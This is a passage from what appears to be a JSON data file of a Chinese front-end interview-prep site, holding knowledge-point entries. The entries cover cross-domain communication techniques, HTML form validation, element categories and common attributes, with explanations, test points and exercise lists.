   iframe.src = iframe.src + location.hash;\n    };\n</script>\n```\n\n3）c.html：([www.domain1.com/c.html](https://link.zhihu.com/?target=http%3A//www.domain1.com/c.html \"https://link.zhihu.com/?target=http%3A//www.domain1.com/c.html\"))\n\n```xml\n<script>\n    // 监听b.html传来的hash值\n    window.onhashchange = function () {\n        // 再通过操作同域a.html的js回调，将结果传回\n        window.parent.parent.onCallback('hello: ' + location.hash.replace('#user=', ''));\n    };\n</script>\n```\n\n### window.name + iframe跨域\n\nwindow.name属性的独特之处：name值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。\n\n1）a.html：(domain1.com/a.html)\n\n```ini\nvar proxy = function(url, callback) {\n    var state = 0;\n    var iframe = document.createElement('iframe');\n    // 加载跨域页面\n    iframe.src = url;\n    // onload事件会触发2次，第1次加载跨域页，并留存数据于window.name\n    iframe.onload = function() {\n        if (state === 1) {\n            // 第2次onload(同域proxy页)成功后，读取同域window.name中数据\n            callback(iframe.contentWindow.name);\n            destoryFrame();\n        } else if (state === 0) {\n            // 第1次onload(跨域页)成功后，切换到同域代理页面\n            iframe.contentWindow.location = 'http://www.domain1.com/proxy.html';\n            state = 1;\n        }\n    };\n    document.body.appendChild(iframe);\n    // 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）\n    function destoryFrame() {\n        iframe.contentWindow.document.write('');\n        iframe.contentWindow.close();\n        document.body.removeChild(iframe);\n    }\n};\n// 请求跨域b页面数据\nproxy('http://www.domain2.com/b.html', function(data){\n    alert(data);\n});\n```\n\n2）proxy.html：(domain1.com/proxy.html)\n\n中间代理页，与a.html同域，内容为空即可。\n\n3）b.html：(domain2.com/b.html)\n\n```xml\n<script>\n    window.name = 'This is domain2 data!';\n</script>\n```\n\n通过iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。\n\n### WebSocket协议跨域\n\nWebSocket protocol是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。\n\n原生WebSocket API使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。\n\n1）前端代码：\n\n```xml\n<div>user input：<input type=\"text\"></div>\n<script src=\"https://cdn.bootcss.com/socket.io/2.2.0/socket.io.js\"></script>\n<script>\nvar socket = io('http://www.domain2.com:8080');\n// 连接成功处理\nsocket.on('connect', function() {\n    // 监听服务端消息\n    socket.on('message', function(msg) {\n        console.log('data from server: ---> ' + msg); \n    });\n    // 监听服务端关闭\n    socket.on('disconnect', function() { \n        console.log('Server socket has closed.'); \n    });\n});\ndocument.getElementsByTagName('input')[0].onblur = function() {\n    socket.send(this.value);\n};\n</script>\n```\n\n### Nodejs socket后台：\n\n```js\nvar http = require('http');\nvar socket = require('socket.io');\n// 启http服务\nvar server = http.createServer(function(req, res) {\n    res.writeHead(200, {\n        'Content-type': 'text/html'\n    });\n    res.end();\n});\nserver.listen('8080');\nconsole.log('Server is running at port 8080...');\n// 监听socket连接\nsocket.listen(server).on('connection', function(client) {\n    // 接收信息\n    client.on('message', function(msg) {\n        client.send('hello：' + msg);\n        console.log('data from client: ---> ' + msg);\n    });\n    // 断开处理\n    client.on('disconnect', function() {\n        console.log('Client socket has closed.'); \n    });\n});\n```",
    "testPoint": "### 1. **同源策略**\n   - 什么是同源策略，为什么存在跨域限制？\n   \n### 2. **常见的跨域场景**\n   - 在什么情况下会出现跨域问题？\n   - 跨域在不同协议、端口、子域名下的表现差异？\n\n### 3. **跨域解决方案**\n   - **CORS**（跨域资源共享）\n     - 如何通过 HTTP 头实现跨域？\n     - 简单请求与复杂请求的区别？\n     - 预检请求（OPTIONS）是什么？\n\n   - **JSONP**\n     - JSONP 如何实现跨域？\n     - JSONP 的局限性和安全问题。\n\n   - **代理服务器**\n     - 如何通过代理服务器解决跨域问题？\n     - 正向代理与反向代理的区别。\n\n   - **WebSocket**\n     - 为什么 WebSocket 可以跨域？\n     - WebSocket 与传统 HTTP 请求的区别。\n\n   - **postMessage**\n     - 什么是 `window.postMessage()`？\n     - 如何在不同窗口或 iframe 之间通信？\n\n   - **跨域资源嵌入**\n     - 如何通过 `<script>`、`<img>`、`<iframe>` 标签实现资源加载？\n     - 什么场景下可以通过这些标签实现跨域？\n\n   - **服务器端跨域处理**\n     - 如何通过 Nginx 或其他服务器配置实现跨域？\n\n   - **document.domain**\n     - 通过 `document.domain` 实现跨子域名通信的原理。\n\n   - **浏览器同源策略放宽**\n     - 如何在开发环境中临时放宽浏览器的同源策略（如使用浏览器插件）？\n\n### 4. **CORS 的具体应用**\n   - CORS 的简单请求与复杂请求的区别？\n   - 允许跨域的 HTTP 头如何设置（如 `Access-Control-Allow-Origin`）？\n   - `withCredentials` 属性的作用及跨域带 Cookie 的处理？\n\n### 5. **跨域通信的安全性**\n   - 跨域通信带来的安全风险？\n   - 如何防止跨域请求中的 CSRF（跨站请求伪造）攻击？\n\n### 6. **浏览器跨域限制的变化**\n   - 不同浏览器对跨域请求的实现差异？\n   - 浏览器如何处理跨域资源加载的限制？",
    "exerciseKeyList": "[\"6843e240-9534-4371-8b64-ba76b4aa8ed4\",\"ce6357ce-cce3-4ccc-90d8-7fe7704f3312\",\"20f1385d-4442-43c5-bb20-2a53a9bfc6c6\",\"e41a4651-2c23-43c7-853c-cdf6039325f6\",\"56e56a05-99c7-4701-ae72-e06d2c6a4d42\",\"87408912-b244-4727-951c-65993c6dbcff\",\"b4001078-1e40-481b-8fcd-c4d48e6dd855\",\"03d5dfc7-9bb9-4129-9145-b4da4d4fa11f\",\"38c7340e-cb35-43e0-8ea0-20e75b2780a5\",\"3538f4eb-5b78-4ffc-aeae-ccfdd45976a4\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 11,
    "createAt": "2024-10-14T02:15:26.000Z",
    "updateAt": "2024-11-10T14:38:50.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "03d5dfc7-9bb9-4129-9145-b4da4d4fa11f",
        "title": "说说webpack proxy工作原理？为什么能解决跨域?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:33:37.000Z",
        "updateAt": "2024-01-25T19:07:54.000Z"
      },
      {
        "exerciseKey": "20f1385d-4442-43c5-bb20-2a53a9bfc6c6",
        "title": "JSONP 是如何实现跨域的?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:17:52.000Z"
      },
      {
        "exerciseKey": "3538f4eb-5b78-4ffc-aeae-ccfdd45976a4",
        "title": "什么是跨域？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:49:49.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "38c7340e-cb35-43e0-8ea0-20e75b2780a5",
        "title": "Vue项目中如何解决跨域问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:51:10.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "56e56a05-99c7-4701-ae72-e06d2c6a4d42",
        "title": "前端怎么实现跨域请求？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T15:50:15.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "6843e240-9534-4371-8b64-ba76b4aa8ed4",
        "title": "postMessage 是如何解决跨域问题的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:15:18.000Z"
      },
      {
        "exerciseKey": "87408912-b244-4727-951c-65993c6dbcff",
        "title": "怎么解决canvas中获取跨域图片数据的问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-08T15:35:58.000Z",
        "updateAt": "2024-08-10T17:06:15.000Z"
      },
      {
        "exerciseKey": "b4001078-1e40-481b-8fcd-c4d48e6dd855",
        "title": "浏览器为什么要有跨域限制？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:49:50.000Z",
        "updateAt": "2024-08-10T17:05:47.000Z"
      },
      {
        "exerciseKey": "ce6357ce-cce3-4ccc-90d8-7fe7704f3312",
        "title": "CORS 是如何实现跨域的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2025-07-16T12:44:36.000Z"
      },
      {
        "exerciseKey": "e41a4651-2c23-43c7-853c-cdf6039325f6",
        "title": "跨域时怎么处理 cookie？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T11:34:09.000Z",
        "updateAt": "2024-08-10T17:06:49.000Z"
      }
    ]
  },
  "134": {
    "id": 134,
    "tagId": 12,
    "title": "表单验证",
    "explanation": "HTML 表单是用于收集用户输入数据的重要元素，通常用于提交到服务器进行处理。它包括一系列控件，如文本输入框、按钮、复选框、单选按钮、文件上传等。表单通过 `form` 标签定义，用户可以通过这些控件与网页进行交互。\n\n### 1. **基础结构**\n   - 表单通过 `<form>` 标签创建，表单的 `action` 属性定义数据提交的目标 URL，`method` 属性定义提交方式（如 `GET` 或 `POST`）。\n   ```html\n   <form action=\"/submit\" method=\"POST\">\n     <input type=\"text\" name=\"username\">\n     <input type=\"submit\" value=\"Submit\">\n   </form>\n   ```\n\n### 2. **表单控件**\n   HTML 表单提供了多种用户输入控件：\n   - **文本输入** (`<input type=\"text\">`, `<textarea>`)\n   - **密码输入** (`<input type=\"password\">`)\n   - **单选框和复选框** (`<input type=\"radio\">`, `<input type=\"checkbox\">`)\n   - **下拉列表** (`<select>`)\n   - **按钮** (`<button>`, `<input type=\"submit\">`)\n   - **文件上传** (`<input type=\"file\">`)\n   - **隐藏输入** (`<input type=\"hidden\">`)\n\n### 3. **表单的属性**\n   - **action**：指定表单数据提交到的 URL。\n   - **method**：定义提交方式，常用 `GET`（将数据附在 URL 后）和 `POST`（将数据放入 HTTP 请求体中）。\n   - **enctype**：指定数据的编码类型，常用于文件上传（如 `multipart/form-data`）。\n   - **autocomplete**：启用或禁用浏览器的自动完成功能。\n\n### 4. **表单校验**\n   HTML5 引入了许多新的表单校验功能，能够减少 JavaScript 校验代码的复杂度。校验功能包括：\n   - 必填字段（`required`）\n   - 正则表达式模式匹配（`pattern`）\n   - 输入长度限制（`minlength`, `maxlength`）\n   - 值范围限制（`min`, `max`, `step`）\n   - 特定的输入类型（如 `email`, `url`）自带的校验规则\n\n### 5. **表单的交互与提交**\n   - 表单可以通过 `input` 类型为 `submit` 或 `<button type=\"submit\">` 来触发提交。\n   - `onsubmit` 事件可以通过 JavaScript 拦截表单提交，进行额外的校验或逻辑处理。\n   - `novalidate` 属性可禁用表单的内置校验功能。\n\n### 6. **表单数据处理**\n   - 在表单提交后，数据会以 URL 编码或表单编码格式提交到服务器。\n   - 使用 JavaScript 可以通过 `FormData` 对象动态操作表单数据，方便处理和提交异步请求（AJAX）。\n\n### 7. **文件上传**\n   - 通过 `<input type=\"file\">` 实现文件上传功能，结合 `enctype=\"multipart/form-data\"` 可以上传多种文件格式。\n   - 文件上传的限制（大小、类型）可以通过 HTML 和 JavaScript 控制。\n\n### 8. **表单的无障碍设计**\n   - 使用 `<label>` 标签关联输入控件，以增强无障碍性和提高用户体验。\n   - 为表单控件添加 `aria` 属性，帮助屏幕阅读器用户更好地理解表单的结构和功能。\n\n### 9. **表单的布局和样式**\n   - 表单布局可以通过 CSS 灵活控制，如使用 `display: flex`、`grid` 等布局方式。\n   - 表单控件的样式可以通过伪类（如 `:valid`, `:invalid`）自定义状态样式。\n\n### 10. **表单的动态性**\n   - 表单可以通过 JavaScript 动态创建、修改或删除表单控件。使用 `addEventListener` 监听表单的交互事件，实现实时反馈和校验。",
    "testPoint": "### 1. **HTML5 表单校验属性**\n   - **required**：必填字段\n   - **pattern**：正则表达式校验\n   - **min/max**：最小值和最大值（适用于 `number`、`date` 等类型）\n   - **minlength/maxlength**：输入的最小长度和最大长度\n   - **step**：步长（适用于 `number`、`range`）\n   - **type 属性校验**：不同 `input` 类型自带的校验（如 `email`、`url`、`tel` 等）\n\n### 2. **内置表单校验 API**\n   - **checkValidity()**：手动触发校验\n   - **reportValidity()**：校验并展示错误提示\n   - **setCustomValidity()**：设置自定义错误消息\n   - **validity 对象**：检查表单字段的校验状态（如 `valid`, `valueMissing`, `typeMismatch` 等）\n\n### 3. **表单校验的错误提示**\n   - 如何自定义错误提示信息？\n   - 使用 `validationMessage` 自定义错误信息展示。\n\n### 4. **浏览器默认校验与自定义校验**\n   - 如何关闭浏览器的默认校验？\n   - 如何与 JavaScript 配合进行自定义表单校验？\n\n### 5. **表单校验与样式**\n   - 使用 CSS 伪类（`:valid`、`:invalid`）进行样式变化。\n   - 如何通过样式反映输入状态（正确、错误提示）？\n\n### 6. **文件输入校验**\n   - **accept** 属性限制文件类型（如 `image/*`、`.pdf` 等）\n   - 如何通过 JavaScript 校验文件大小、类型等属性？\n\n### 7. **跨浏览器兼容性**\n   - 不同浏览器对于表单校验的支持和差异。\n\n### 8. **表单校验与无障碍支持**\n   - 如何为屏幕阅读器提供适当的错误提示？\n\n### 9. **禁用 HTML 校验**\n   - 如何通过 `novalidate` 禁用表单的 HTML 校验，并通过 JavaScript 实现自定义校验。\n\n### 10. **表单验证的用户体验**\n   - 提交表单时，如何提升用户体验（如实时反馈、避免阻塞操作等）？\n   - 如何处理错误提示的布局和显示方式以提升用户体验？\n",
    "exerciseKeyList": "[\"2efd0e6a-c70c-4df5-965d-4e13b48fbd21\",\"a9413c3f-5575-464e-8c37-511bf9e32185\",\"fcc981b9-4770-402a-a1cf-c838a252420a\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 12,
    "createAt": "2024-10-14T08:39:49.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "2efd0e6a-c70c-4df5-965d-4e13b48fbd21",
        "title": "HTTP 中如何处理表单数据的提交？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-06T13:24:47.000Z",
        "updateAt": "2024-08-10T17:06:08.000Z"
      },
      {
        "exerciseKey": "a9413c3f-5575-464e-8c37-511bf9e32185",
        "title": "怎么预防用户快速连续点击，造成数据多次提交？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-09T12:34:40.000Z",
        "updateAt": "2024-01-03T09:16:32.000Z"
      },
      {
        "exerciseKey": "fcc981b9-4770-402a-a1cf-c838a252420a",
        "title": "怎么实现表单项间的联动？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-14T09:33:19.000Z",
        "updateAt": "2024-10-14T09:33:46.000Z"
      }
    ]
  },
  "135": {
    "id": 135,
    "tagId": 12,
    "title": "HTML 元素分类",
    "explanation": "根据标签的功能和表现，HTML 标签主要分为以下几类：\n\n### 1. **块级元素（Block-level Elements）**\n   块级元素通常独占一行，并且可以包含其他块级元素或内联元素，能够扩展至父容器的全部宽度。\n\n   - **特点**：\n     - 独占一行，默认情况下会在前后产生换行。\n     - 宽度默认是父元素的 100%。\n     - 可以设置 `width`、`height`、`margin`、`padding` 等布局属性。\n\n   - **常见的块级元素**：\n     - `<div>`：无特定语义的容器，常用于布局。\n     - `<p>`：段落标签。\n     - `<h1>` 到 `<h6>`：标题标签，按重要性递减。\n     - `<ul>`、`<ol>`、`<li>`：无序、有序列表及其项。\n     - `<header>`、`<footer>`、`<section>`、`<article>`：HTML5 语义化标签，分别表示页头、页尾、内容区块等。\n\n   - **示例**：\n     ```html\n     <div>\n       <h1>标题</h1>\n       <p>这是一个段落。</p>\n     </div>\n     ```\n\n### 2. **内联元素（Inline Elements）**\n   内联元素与其他元素排列在同一行，且只占用其内容所需的宽度。它们不会独占一行，不能包含块级元素。\n\n   - **特点**：\n     - 与相邻的内联元素排列在同一行。\n     - 仅占据自身内容的宽度，不会在前后产生换行。\n     - 不能设置 `width`、`height`（无效），但可以设置 `padding` 和 `margin`，只影响水平方向。\n   \n   - **常见的内联元素**：\n     - `<span>`：无特定语义的容器，常用于局部样式。\n     - `<a>`：超链接。\n     - `<strong>`：表示强调的文本，通常加粗显示。\n     - `<em>`：表示强调的文本，通常斜体显示。\n     - `<img>`：图像标签。\n     - `<input>`：表单输入元素。\n\n   - **示例**：\n     ```html\n     <p>这是一个段落，<a href=\"#\">点击这里</a> 了解更多。</p>\n     ```\n\n### 3. **内联块元素（Inline-block Elements）**\n   内联块元素是同时具备内联元素和块级元素特性的元素。它们在布局上是内联的，但表现为块状元素，因此可以设置宽高。\n\n   - **特点**：\n     - 与其他元素排列在同一行，但可设置宽度和高度。\n     - 不会自动换行。\n   \n   - **常见的内联块元素**：\n     - `<img>`：虽然图像显示在行内，但可以设置 `width` 和 `height`。\n     - `<button>`：按钮。\n     - `<input type=\"text\">`：文本输入框。\n     - **CSS 设置为 `display: inline-block` 的元素**。\n\n   - **示例**：\n     ```html\n     <span style=\"display: inline-block; width: 100px; height: 100px; background: red;\"></span>\n     ```\n\n### 4. **自闭合元素（Self-closing Elements）**\n   自闭合元素是没有闭合标签的元素，因为它们没有任何内容。这类标签通常用于插入内容或进行控制，而不包含其他内容。\n\n   - **特点**：\n     - 不需要关闭标签。\n     - 直接在标签内结束。\n   \n   - **常见的自闭合元素**：\n     - `<img>`：图像。\n     - `<input>`：表单输入。\n     - `<br>`：换行。\n     - `<hr>`：水平线。\n\n   - **示例**：\n     ```html\n     <img src=\"image.jpg\" alt=\"图片描述\">\n     <br />\n     ```\n\n### 5. **语义化标签（Semantic Elements）**\n   HTML5 提供了一些语义化标签，它们描述了页面不同部分的语义，使文档结构更加清晰，同时对 SEO 和无障碍访问更友好。\n\n   - **常见的语义化标签**：\n     - `<header>`：定义页面或章节的头部。\n     - `<footer>`：定义页面或章节的底部。\n     - `<nav>`：定义导航链接的区域。\n     - `<article>`：表示独立的内容块。\n     - `<section>`：表示文档的某个部分。\n     - `<aside>`：定义侧边栏或附属内容。\n     - `<main>`：定义页面的主要内容。\n\n   - **示例**：\n     ```html\n     <header>\n       <h1>页面标题</h1>\n     </header>\n     <main>\n       <article>\n         <h2>文章标题</h2>\n         <p>文章内容</p>\n       </article>\n     </main>\n     <footer>\n       <p>版权信息</p>\n     </footer>\n     ```\n\n### 6. **表单元素（Form Elements）**\n   表单元素用于收集用户输入的数据，通常与服务器交互。\n\n   - **常见的表单元素**：\n     - `<form>`：定义表单容器。\n     - `<input>`：各种类型的输入框（如文本、密码、单选按钮等）。\n     - `<textarea>`：多行文本输入框。\n     - `<select>` 和 `<option>`：下拉选择框。\n     - `<button>`：按钮。\n     - `<label>`：用于表单项的文本标签。\n     - `<fieldset>` 和 `<legend>`：用于对表单区域进行分组。\n   \n   - **示例**：\n     ```html\n     <form action=\"/submit\" method=\"POST\">\n       <label for=\"name\">Name:</label>\n       <input type=\"text\" id=\"name\" name=\"name\">\n       <button type=\"submit\">Submit</button>\n     </form>\n     ```\n\n### 7. **媒体元素（Media Elements）**\n   媒体元素用于嵌入多媒体，如音频、视频等。\n\n   - **常见的媒体元素**：\n     - `<img>`：嵌入图像。\n     - `<audio>`：嵌入音频。\n     - `<video>`：嵌入视频。\n     - `<source>`：为音频和视频提供多个资源。\n   \n   - **示例**：\n     ```html\n     <video controls>\n       <source src=\"movie.mp4\" type=\"video/mp4\">\n       Your browser does not support the video tag.\n     </video>\n     ```\n\n### 8. **元数据元素（Metadata Elements）**\n   元数据元素不会直接显示在页面上，而是用于提供页面的额外信息，例如页面标题、描述、字符集等。\n\n   - **常见的元数据元素**：\n     - `<title>`：定义页面的标题。\n     - `<meta>`：提供页面的元数据，如描述、关键词等。\n     - `<link>`：定义与外部资源的关系，如 CSS 文件。\n     - `<style>`：定义页面的内联样式。\n     - `<script>`：嵌入或引用 JavaScript 代码。\n   \n   - **示例**：\n     ```html\n     <head>\n       <meta charset=\"UTF-8\">\n       <meta name=\"description\" content=\"网页描述\">\n       <title>网页标题</title>\n       <link rel=\"stylesheet\" href=\"styles.css\">\n     </head>\n     ```",
    "testPoint": "### 1. **块级元素（Block-level Elements）**\n   - 定义块级元素的特点\n   - 常见的块级元素有哪些？\n   - 块级元素与行级元素的主要区别是什么？\n\n### 2. **行内元素（Inline Elements）**\n   - 定义行内元素的特点\n   - 常见的行内元素有哪些？\n   - 行内元素是否可以包含块级元素？\n\n### 3. **行内块元素（Inline-block Elements）**\n   - 什么是行内块元素？\n   - 行内块元素的应用场景及特点。\n\n### 4. **语义化元素**\n   - 什么是语义化元素？\n   - HTML5 引入的语义化元素有哪些（如 `<article>`、`<section>`、`<header>` 等）？\n   - 语义化标签的作用及其对 SEO 和无障碍设计的影响。\n\n### 5. **HTML5 新增的结构性元素**\n   - HTML5 引入的结构性标签有哪些？它们的语义和应用场景（如 `<nav>`、`<footer>`、`<aside>` 等）？\n\n### 6. **自闭合元素**\n   - 什么是自闭合元素？\n   - 常见的自闭合元素有哪些？（如 `<img>`、`<br>`、`<input>` 等）\n   - 自闭合元素是否需要关闭标签？\n\n### 7. **可替换元素**\n   - 什么是可替换元素？\n   - 常见的可替换元素有哪些？（如 `<img>`、`<input>`、`<iframe>`）\n   - 可替换元素的特性与布局影响。\n\n### 8. **表单元素**\n   - 表单元素的分类及其应用场景（如 `<input>`、`<select>`、`<textarea>`）。\n   - 表单元素的语义化和无障碍设计考量。\n\n### 9. **全局属性**\n   - 哪些是 HTML 元素的全局属性？\n   - 全局属性（如 `class`、`id`、`data-*`、`style`、`title`）如何应用到不同类型的元素上？\n\n### 10. **隐式元素与显式元素**\n   - 什么是隐式元素？（如 `tbody`）\n   - 隐式元素的作用以及何时需要显式声明。\n\n### 11. **HTML 内容模型**\n   - 元素内容模型的分类：流内容、元内容、嵌入内容、交互内容等。\n   - 不同类型的元素如何组合使用？\n\n### 12. **嵌套规则**\n   - 块级元素与行内元素的嵌套规则。\n   - 哪些元素不能嵌套在一起？",
    "exerciseKeyList": "[\"d6a65597-0522-4127-bbe1-68eb9da818ee\",\"c130f552-a50b-4a88-b74c-bd992dfab692\",\"9464dbb8-2b6b-4309-83fa-15a5eb72ead1\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 3,
    "createAt": "2024-10-15T01:40:33.000Z",
    "updateAt": "2024-11-06T06:13:15.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "9464dbb8-2b6b-4309-83fa-15a5eb72ead1",
        "title": "说说你对 html 嵌套规则的了解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-15T01:40:12.000Z",
        "updateAt": "2024-10-15T01:40:19.000Z"
      },
      {
        "exerciseKey": "c130f552-a50b-4a88-b74c-bd992dfab692",
        "title": "行内元素和块级元素有什么区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T15:09:08.000Z",
        "updateAt": "2024-07-19T15:52:37.000Z"
      },
      {
        "exerciseKey": "d6a65597-0522-4127-bbe1-68eb9da818ee",
        "title": "行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T05:36:54.000Z",
        "updateAt": "2024-07-22T10:10:09.000Z"
      }
    ]
  },
  "136": {
    "id": 136,
    "tagId": 12,
    "title": "HTML 常见属性",
    "explanation": "HTML 元素的属性是用于控制元素行为或样式的附加信息。\n\n以下是一些常见的 HTML 属性：\n\n### 1. **通用属性（Global Attributes）**\n   这些属性几乎可以应用于所有 HTML 元素：\n   - **`id`**：元素的唯一标识符，用于 JavaScript 或 CSS 选择。\n     ```html\n     <div id=\"main\"></div>\n     ```\n   - **`class`**：为元素指定一个或多个类名，用于 CSS 样式或 JavaScript 操作。\n     ```html\n     <div class=\"container header\"></div>\n     ```\n   - **`style`**：为元素设置内联样式。\n     ```html\n     <div style=\"color: red;\"></div>\n     ```\n   - **`title`**：为元素提供额外信息，当鼠标悬停在元素上时显示。\n     ```html\n     <button title=\"Click me!\">Click</button>\n     ```\n   - **`data-*`**：自定义属性，用于存储私有数据，以 `data-` 为前缀，可以通过 JavaScript 访问。\n     ```html\n     <div data-user-id=\"123\"></div>\n     ```\n\n### 2. **事件属性（Event Attributes）**\n   这些属性用于处理元素上的事件：\n   - **`onclick`**：定义单击事件处理函数。\n     ```html\n     <button onclick=\"alert('Clicked!')\">Click me</button>\n     ```\n   - **`onmouseover`**：鼠标悬停时触发的事件。\n     ```html\n     <div onmouseover=\"console.log('Mouse over')\"></div>\n     ```\n   - **`onkeydown`**：按下键盘时触发的事件。\n     ```html\n     <input type=\"text\" onkeydown=\"handleKeyDown(event)\">\n     ```\n\n### 3. **表单相关属性**\n   - **`type`**：定义输入框类型，例如 `text`、`password`、`email` 等。\n     ```html\n     <input type=\"text\">\n     ```\n   - **`name`**：定义表单元素的名称，用于表单提交。\n     ```html\n     <input type=\"text\" name=\"username\">\n     ```\n   - **`value`**：定义表单元素的默认值。\n     ```html\n     <input type=\"text\" value=\"Default value\">\n     ```\n   - **`placeholder`**：为输入框提供占位符文本，提示用户输入。\n     ```html\n     <input type=\"text\" placeholder=\"Enter your name\">\n     ```\n   - **`disabled`**：禁用输入元素，使其不可交互。\n     ```html\n     <input type=\"text\" disabled>\n     ```\n   - **`required`**：标记表单元素为必填项。\n     ```html\n     <input type=\"text\" required>\n     ```\n\n### 4. **链接和资源加载属性**\n   - **`href`**：用于指定超链接的目标 URL。\n     ```html\n     <a href=\"https://example.com\">Go to example.com</a>\n     ```\n   - **`src`**：指定图像、脚本或其他资源的路径。\n     ```html\n     <img src=\"image.jpg\" alt=\"Image description\">\n     ```\n   - **`alt`**：为图像提供替代文本，图像无法加载时显示。\n     ```html\n     <img src=\"image.jpg\" alt=\"Alternative text\">\n     ```\n   - **`rel`**：指定链接与目标文档的关系，常用于 `link` 标签和 `a` 标签。\n     ```html\n     <link rel=\"stylesheet\" href=\"style.css\">\n     ```\n   - **`target`**：定义链接的打开方式，常用值包括 `_self`（当前窗口）和 `_blank`（新窗口）。\n     ```html\n     <a href=\"https://example.com\" target=\"_blank\">Open in new tab</a>\n     ```\n\n### 5. **多媒体属性**\n   - **`controls`**：为 `<audio>` 或 `<video>` 元素添加播放控件。\n     ```html\n     <video src=\"video.mp4\" controls></video>\n     ```\n   - **`autoplay`**：自动播放音频或视频。\n     ```html\n     <audio src=\"audio.mp3\" autoplay></audio>\n     ```\n   - **`loop`**：音频或视频播放完后重新开始播放。\n     ```html\n     <video src=\"video.mp4\" loop></video>\n     ```\n   - **`muted`**：自动静音视频或音频。\n     ```html\n     <audio src=\"audio.mp3\" muted></audio>\n     ```\n\n### 6. **图像和媒体相关属性**\n   - **`width`** 和 **`height`**：定义图像或视频的宽度和高度。\n     ```html\n     <img src=\"image.jpg\" width=\"200\" height=\"100\">\n     ```\n\n### 7. **iframe 属性**\n   - **`src`**：定义嵌入的网页 URL。\n     ```html\n     <iframe src=\"https://example.com\"></iframe>\n     ```\n   - **`sandbox`**：为嵌入内容提供更严格的限制，控制 iframe 的行为。\n     ```html\n     <iframe src=\"https://example.com\" sandbox></iframe>\n     ```\n\n### 8. **语义化属性**\n   - **`role`**：为屏幕阅读器和辅助技术提供语义化描述。\n     ```html\n     <div role=\"navigation\"></div>\n     ```\n\n### 9. **布局和可访问性属性**\n   - **`hidden`**：隐藏元素，元素不会显示在页面中。\n     ```html\n     <div hidden>This content is hidden</div>\n     ```\n   - **`tabindex`**：定义元素的 tab 键导航顺序。\n     ```html\n     <button tabindex=\"1\">First</button>\n     <button tabindex=\"2\">Second</button>\n     ```",
    "testPoint": "### 1. **全局属性（Global Attributes）**\n   - **class**：用于给元素指定样式类，如何使用多个类？有哪些常见用法？\n   - **id**：唯一标识元素，`id` 的作用和注意事项。\n   - **style**：内联样式的作用及其优先级。\n   - **title**：为元素提供额外信息（鼠标悬停时显示）。\n   - **data-* 属性**：自定义数据属性，如何在 JavaScript 中访问 `data-*` 属性？\n\n### 2. **事件属性（Event Attributes）**\n   - **onclick**、**onmouseover** 等事件处理属性。\n   - 如何使用事件属性进行事件绑定？\n   - 事件属性和 JavaScript 事件监听器（`addEventListener`）的区别和应用场景。\n\n### 3. **表单属性**\n   - **name**：用于提交表单数据时作为键名。\n   - **action**：表单提交的目标 URL。\n   - **method**：表单的提交方式（`GET` 或 `POST`）。\n   - **autocomplete**：是否启用表单自动填充。\n   - **required**、**pattern**、**min/max** 等 HTML5 校验属性。\n\n### 4. **输入控件相关属性**\n   - **value**：为输入控件设置默认值。\n   - **placeholder**：为输入框提供提示文本。\n   - **disabled**：禁用输入控件。\n   - **readonly**：只读属性，控件不能被修改。\n   - **maxlength/minlength**：输入字符长度的限制。\n   - **accept**：文件上传时，限制允许的文件类型（适用于 `<input type=\"file\">`）。\n\n### 5. **媒体元素属性**\n   - **src**：媒体文件的路径（适用于 `<img>`、`<audio>`、`<video>` 等）。\n   - **alt**：图片无法加载时显示的替代文本。\n   - **controls**：是否为媒体文件显示默认控制条。\n   - **autoplay**：媒体文件是否自动播放。\n   - **loop**：媒体文件是否循环播放。\n   - **muted**：媒体文件是否静音。\n\n### 6. **超链接相关属性**\n   - **href**：链接目标的 URL。\n   - **target**：定义链接打开的方式（如 `_blank` 打开新窗口）。\n   - **download**：允许下载链接资源，而不是导航到资源。\n   - **rel**：定义链接与当前文档的关系（如 `nofollow`、`noopener`）。\n\n### 7. **iframe 属性**\n   - **src**：嵌入的文档或网页的 URL。\n   - **sandbox**：启用或禁用特定行为（如禁止脚本、表单提交等）。\n   - **allow**：控制 iframe 